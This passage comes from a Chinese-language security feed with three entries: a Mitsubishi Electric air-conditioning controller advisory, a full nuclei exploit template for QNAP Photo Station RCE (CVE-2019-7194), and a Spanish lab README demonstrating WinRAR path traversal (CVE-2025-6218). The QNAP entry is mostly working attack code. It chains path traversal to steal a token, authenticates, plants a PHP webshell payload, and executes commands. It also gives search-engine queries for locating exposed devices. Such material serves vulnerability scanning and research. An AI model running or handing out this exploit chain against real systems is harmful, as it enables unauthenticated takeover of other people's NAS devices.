    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-73r7-73gp-j7mv">https://github.com/advisories/GHSA-73r7-73gp-j7mv</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3699">https://nvd.nist.gov/vuln/detail/CVE-2025-3699</a></p></li><li><p><a href="https://jvn.jp/vu/JVNVU96471539">https://jvn.jp/vu/JVNVU96471539</a></p></li><li><p><a href="https://www.mitsubishielectric.com/psirt/vulnerability/pdf/2025-004_en.pdf">https://www.mitsubishielectric.com/psirt/vulnerability/pdf/2025-004_en.pdf</a></p></li><li><p><a href="https://github.com/advisories/GHSA-73r7-73gp-j7mv">https://github.com/advisories/GHSA-73r7-73gp-j7mv</a></p></li></ul><p><strong>描述：</strong></p><p>Missing Authentication for Critical Function vulnerability in Mitsubishi Electric Corporation G-50 Version 3.37 and prior, G-50-W Version 3.37 and prior, G-50A Version 3.37 and prior, GB-50 Version 3.37 and prior, GB-50A Version 3.37 and prior, GB-24A Version 9.12 and prior, G-150AD Version 3.21 and prior, AG-150A-A Version 3.21 and prior, AG-150A-J Version 3.21 and prior, GB-50AD Version 3.21 and prior, GB-50ADA-A Version 3.21 and prior, GB-50ADA-J Version 3.21 and prior, EB-50GU-A Version 7.11 and prior, EB-50GU-J Version 7.11 and prior, AE-200J Version 8.01 and prior, AE-200A Version 8.01 and prior, AE-200E Version 8.01 and prior, AE-50J Version 8.01 and prior, AE-50A Version 8.01 and prior, AE-50E Version 8.01 and prior, EW-50J Version 8.01 and prior, EW-50A Version 8.01 and prior, EW-50E Version 8.01 and prior, TE-200A Version 8.01 and prior, TE-50A Version 8.01 and prior, TW-50A Version 8.01 and prior, and CMS-RMD-J Version 1.40 and prior allows a remote unauthenticated attacker to bypass authentication and then control the air conditioning systems illegally, or disclose information in them by exploiting this vulnerability. In addition, the attacker may tamper with firmware for them using the disclosed information.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-73r7-73gp-j7mv&quot;&gt;https://github.com/advisories/GHSA-73r7-73gp-j7mv&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>QNAP Photo Station 远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/27/github_1864138974/"/>
    <id>http://example.com/2025/06/27/github_1864138974/</id>
    <published>2025-06-27T00:45:36.597Z</published>
    <updated>2025-06-27T00:45:36.594Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> QNAP Photo Station 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-7194</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> QNAP Photo Station 6.0.3之前的版本存在多个漏洞，当这些漏洞被串联利用时，可实现未经身份验证的远程代码执行（RCE）。这包括一个涉及文件名或路径外部控制的缺陷，允许攻击者访问或修改敏感系统文件。为了降低这些风险，QNAP强烈建议将Photo Station更新到最新可用版本。</p><p><strong>产品厂商：</strong> qnap</p><p><strong>产品名称：</strong> photo_station</p><p><strong>影响版本：</strong> &lt; 6.0.3</p><p><strong>搜索语法：</strong> title&#x3D;”photo station” || title&#x3D;”qnap”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/ab7ef0f3aec8b81526b38790ba11ab49d8a0a2c7/http%2Fcves%2F2019%2FCVE-2019-7194.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/ab7ef0f3aec8b81526b38790ba11ab49d8a0a2c7/http%2Fcves%2F2019%2FCVE-2019-7194.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7194</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> QNAP Photo Station <span class="hljs-operator">&lt;</span> <span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> <span class="hljs-operator">-</span> Remote Code Execution<br>  <span class="hljs-params">author:</span> x-stp<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    QNAP Photo Station versions prior to <span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> contain multiple vulnerabilities that, when chained together, enable unauthenticated remote code execution (RCE).<br>    This includes a flaw involving external control of file names <span class="hljs-keyword">or</span> paths, allowing attackers to access <span class="hljs-keyword">or</span> modify sensitive system files.<br>    To mitigate these risks, QNAP strongly recommends updating Photo Station to the latest available versions.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/ARPSyndicate/cvemon</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/Ostorlab/KEV</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/cyb3r-w0lf/nuclei-template-collection</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/xbl3/awesome-cve-poc_qazbnm456</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">7194</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">22</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.89163</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99497</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:qnap:photo_station:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">vendor:</span> qnap<br>    <span class="hljs-params">product:</span> photo_station<br>    <span class="hljs-params">shodan-query:</span><br>      <span class="hljs-operator">-</span> content-length:<span class="hljs-string">&quot;580 &quot;</span>http server <span class="hljs-number">1.0</span><span class="hljs-string">&quot;&quot;</span><br>      <span class="hljs-operator">-</span> http.title:<span class="hljs-string">&quot;photo station&quot;</span><br>      <span class="hljs-operator">-</span> http.title:<span class="hljs-string">&quot;qnap&quot;</span><br>    <span class="hljs-params">fofa-query:</span><br>      <span class="hljs-operator">-</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;photo station&quot;</span><br>      <span class="hljs-operator">-</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;qnap&quot;</span><br>    <span class="hljs-params">google-query:</span><br>      <span class="hljs-operator">-</span> intitle:<span class="hljs-string">&quot;photo station&quot;</span><br>      <span class="hljs-operator">-</span> intitle:<span class="hljs-string">&quot;qnap&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2019,qnap,rce,photostation,unauth,injection,lfi,kev,intrusive<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">command_payload:</span> &#x27;%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>d%<span class="hljs-number">60</span>%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>Bx%<span class="hljs-number">5</span>D%<span class="hljs-number">60</span>%<span class="hljs-number">3</span>f%<span class="hljs-number">3</span>e%<span class="hljs-number">40</span>s.tp&#x27;<br>  <span class="hljs-params">dropper_command:</span> <span class="hljs-string">&quot;x= echo $((0x2C06*1337))&quot;</span><br>  <span class="hljs-params">dropper_filename:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_text_alpha(6))&#125;&#125;&quot;</span><br><br><span class="hljs-params">flow:</span> |<br>  http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">3</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">4</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">5</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">6</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">7</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/p/api/album.php&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;a=setSlideshow&amp;f=qsamplealbum&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> album_id<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&lt;output&gt;([a-zA-Z0-9]+)&lt;/output&gt;&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/slideshow.php?album=&#123;&#123;album_id&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> access_code<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;encodeURIComponent<span class="hljs-char escape_">\\</span>(&#x27;([A-Za-z0-9%]+)&#x27;<span class="hljs-char escape_">\\</span>)&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">name:</span> phpsessid<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;PHPSESSID=([a-z0-9]+);&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/p/api/video.php&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>      <span class="hljs-params">Cookie:</span> <span class="hljs-string">&quot;PHPSESSID=&#123;&#123;phpsessid&#125;&#125;&quot;</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;a=caption&amp;f=UMGObv&amp;album=&#123;&#123;album_id&#125;&#125;&amp;ac=&#123;&#123;access_code&#125;&#125;&amp;filename=../../../../../share/Multimedia/.@__thumb/ps.app.token&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> app_token<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;([a-f0-9]&#123;32&#125;)&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/cgi-bin/authLogin.cgi&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;app=PHOTO_STATION&amp;auth=1&amp;app_token=&#123;&#123;app_token&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">name:</span> nas_sid<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-symbol">&lt;authSid&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>\[CDATA\[([a-z0-<span class="hljs-number">9</span>]<span class="hljs-operator">+</span>)\]\]<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>authSid<span class="hljs-operator">&gt;</span>&#x27;<br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/cgi-bin/userConfig.cgi?sid=&#123;&#123;nas_sid&#125;&#125;&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span>UTF-<span class="hljs-number">8</span><br>      <span class="hljs-params">X-Requested-With:</span> XMLHttpRequest<br>      <span class="hljs-params">Cookie:</span> <span class="hljs-string">&quot;DESKTOP=1; WINDOW_MODE=1; NAS_SID=&#123;&#123;nas_sid&#125;&#125;; PHPSESSID=&#123;&#123;phpsessid&#125;&#125;&quot;</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;func=addPersonalSmtp&amp;provider_idx=0&amp;sender=&#123;&#123;command_payload&#125;&#125;&amp;default=0&amp;smtp_server=0.0.0.0&amp;port=25&amp;security=-1&amp;email_account=a%40b.com&amp;email_passwd=ac1db1tch3z&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/slideshow.php?album=qsamplealbum&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Cookie:</span> <span class="hljs-string">&quot;QMS_SID=../../../../../../../../../../mnt/ext/opt/photostation2/&#123;&#123;dropper_filename&#125;&#125;.php; PHPSESSID=&#123;&#123;phpsessid&#125;&#125;; NAS_SID=&#123;&#123;nas_sid&#125;&#125;; DESKTOP=1; CACHE=&#123;&#123;randstr&#125;&#125;;&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> POST<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/photo/&#123;&#123;dropper_filename&#125;&#125;.php&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>      <span class="hljs-params">Cookie:</span> <span class="hljs-string">&quot;PHPSESSID=&#123;&#123;phpsessid&#125;&#125;; NAS_SID=&#123;&#123;nas_sid&#125;&#125;&quot;</span><br>    <span class="hljs-params">body:</span> <span class="hljs-string">&quot;&#123;&#123;dropper_command&#125;&#125;&quot;</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;NASVARS&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;15067990&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; QNAP Photo Station 远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;str</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>WinRAR 路径遍历漏洞</title>
    <link href="http://example.com/2025/06/27/github_2508397996/"/>
    <id>http://example.com/2025/06/27/github_2508397996/</id>
    <published>2025-06-27T00:45:21.925Z</published>
    <updated>2025-06-27T00:45:21.922Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> WinRAR 路径遍历漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-6218</li></ul><p><strong>漏洞类型：</strong> 目录穿越</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 此漏洞影响WinRAR 7.11及更早版本，包括6.x和一些5.x版本。攻击者可以通过构造恶意的.rar文件，利用路径相对路径（....\）在解压时覆盖目标目录外的文件，可能导致代码执行或敏感文件被篡改。WinRAR 7.12及更高版本不受此漏洞影响。</p><p><strong>产品厂商：</strong> WinRAR</p><p><strong>产品名称：</strong> WinRAR</p><p><strong>影响版本：</strong> version &lt;&#x3D; 7.11</p><p><strong>来源：</strong> <a href="https://github.com/speinador/CVE-2025-6218_WinRAR">https://github.com/speinador/CVE-2025-6218_WinRAR</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>archivo_exploit.rar</li><li>crear_rar_malicioso.bat</li><li>importante.txt</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="🧪-CVE-2025-6218-Path-Traversal-en-WinRAR"><a href="#🧪-CVE-2025-6218-Path-Traversal-en-WinRAR" class="headerlink" title="🧪 CVE-2025-6218: Path Traversal en WinRAR"></a>🧪 CVE-2025-6218: Path Traversal en WinRAR</h2><h3 id="📌-Descripcion"><a href="#📌-Descripcion" class="headerlink" title="📌 Descripción"></a>📌 Descripción</h3><p>Este laboratorio demuestra cómo explotar la vulnerabilidad <strong>CVE-2025-6218</strong> en versiones vulnerables de <strong>WinRAR</strong> para Windows. Esta vulnerabilidad permite que un archivo <code>.rar</code> malicioso sobrescriba archivos fuera del directorio de extracción usando rutas relativas (<code>..\..\</code>), lo que puede llevar a la ejecución de código o la manipulación de archivos sensibles.</p><blockquote><p>⚠️ <strong>Este laboratorio es solo con fines educativos.</strong> Debe ejecutarse en una <strong>máquina virtual aislada</strong>, sin conexión a redes productivas.</p></blockquote><hr><h3 id="🛡️-Versiones-Vulnerables"><a href="#🛡️-Versiones-Vulnerables" class="headerlink" title="🛡️ Versiones Vulnerables"></a>🛡️ Versiones Vulnerables</h3><p>La vulnerabilidad afecta a:</p><ul><li><strong>WinRAR 7.11 y anteriores</strong> (incluyendo versiones 6.x y algunas 5.x).</li><li>Las versiones vulnerables no filtran correctamente las rutas relativas (<code>..\..\</code>) durante la extracción.</li><li><strong>No afecta</strong> a WinRAR 7.12 y posteriores.</li></ul><p>Se recomienda encarecidamente actualizar a <a href="https://www.win-rar.com/download.html">WinRAR 7.12</a> o superior.</p><hr><h3 id="🎯-Objetivo-del-Laboratorio"><a href="#🎯-Objetivo-del-Laboratorio" class="headerlink" title="🎯 Objetivo del Laboratorio"></a>🎯 Objetivo del Laboratorio</h3><ul><li>Entender el concepto de Path Traversal en archivos comprimidos.</li><li>Observar cómo un archivo <code>.rar</code> manipulado puede sobrescribir archivos fuera del destino.</li><li>Destacar la importancia de mantener el software actualizado.</li></ul><hr><h3 id="🧰-Requisitos"><a href="#🧰-Requisitos" class="headerlink" title="🧰 Requisitos"></a>🧰 Requisitos</h3><ul><li>Máquina virtual con Windows 10 u 11.</li><li>WinRAR 7.11 o anterior.</li><li>Archivo de prueba: <code>C:\Users\victima\Desktop\importante.txt</code></li><li>WinRAR instalado o ejecutable (<code>winrar.exe</code>).</li><li>Archivo malicioso <code>archivo_exploit.rar</code> (incluido en este ZIP).</li></ul><hr><h3 id="🛠️-Preparacion-del-Entorno"><a href="#🛠️-Preparacion-del-Entorno" class="headerlink" title="🛠️ Preparación del Entorno"></a>🛠️ Preparación del Entorno</h3><ol><li><p><strong>Instalar WinRAR vulnerable</strong> (por ejemplo 7.11).</p></li><li><p><strong>Crear archivo legítimo a sobrescribir</strong>:</p> <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> Archivo legítimo &gt; <span class="hljs-string">&quot;C:\Users\victima\Desktop\importante.txt&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>Extraer <code>archivo_exploit.rar</code></strong> desde este laboratorio en cualquier carpeta (por ejemplo, <code>C:\temp</code>).</p></li><li><p><strong>Abrir el <code>.rar</code> con WinRAR</strong> y extraerlo a un directorio cualquiera. El archivo será extraído con una ruta como:</p> <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">..</span>\<span class="hljs-string">..</span>\Users\victima\Desktop\importante.txt<br></code></pre></td></tr></table></figure><p> Lo que resultará en que el archivo original será sobrescrito.</p></li></ol><hr><h3 id="🔍-Que-se-debe-observar"><a href="#🔍-Que-se-debe-observar" class="headerlink" title="🔍 Qué se debe observar?"></a>🔍 Qué se debe observar?</h3><ul><li>Antes de la extracción: <code>importante.txt</code> dice “Archivo legítimo”.</li><li>Después de extraer el <code>.rar</code> malicioso: dice “MALWARE INYECTADO”.</li><li>La extracción no ocurrió en el escritorio, pero el archivo fue sobrescrito debido a la ruta relativa.</li></ul><hr><h3 id="✅-Solucion"><a href="#✅-Solucion" class="headerlink" title="✅ Solución"></a>✅ Solución</h3><p>Actualizar WinRAR a la versión <strong>7.12 o superior</strong>.</p><hr><h3 id="🧪-Contenido-del-Repositorio"><a href="#🧪-Contenido-del-Repositorio" class="headerlink" title="🧪 Contenido del Repositorio"></a>🧪 Contenido del Repositorio</h3><table><thead><tr><th>Archivo</th><th>Descripción</th></tr></thead><tbody><tr><td><code>archivo_exploit.rar</code></td><td>Archivo comprimido con ruta de escape (<code>..\..\</code>)</td></tr><tr><td><code>importante.txt</code></td><td>Archivo legítimo antes del ataque</td></tr><tr><td><code>crear_rar_malicioso.bat</code></td><td>Script demostrativo para generar el <code>.rar</code> (si se desea)</td></tr><tr><td><code>README.md</code></td><td>Esta guía paso a paso</td></tr></tbody></table><hr><h3 id="🧑‍🏫-Autor"><a href="#🧑‍🏫-Autor" class="headerlink" title="🧑‍🏫 Autor"></a>🧑‍🏫 Autor</h3><p>Explicación elaborada por <a href="https://www.linkedin.com/in/sebastian-j-peinador/">Sebastian Peinador</a> para propósitos didácticos y de investigación en ciberseguridad ofensiva.</p><hr><h3 id="📄-Licencia"><a href="#📄-Licencia" class="headerlink" title="📄 Licencia"></a>📄 Licencia</h3><p>Este material se distribuye bajo la licencia <a href="LICENSE">MIT</a>.</p><hr><blockquote><p>Si te resulta útil, ¡no olvides darle ⭐ al repo o compartirlo!</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; WinRAR 路径遍历漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/str</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
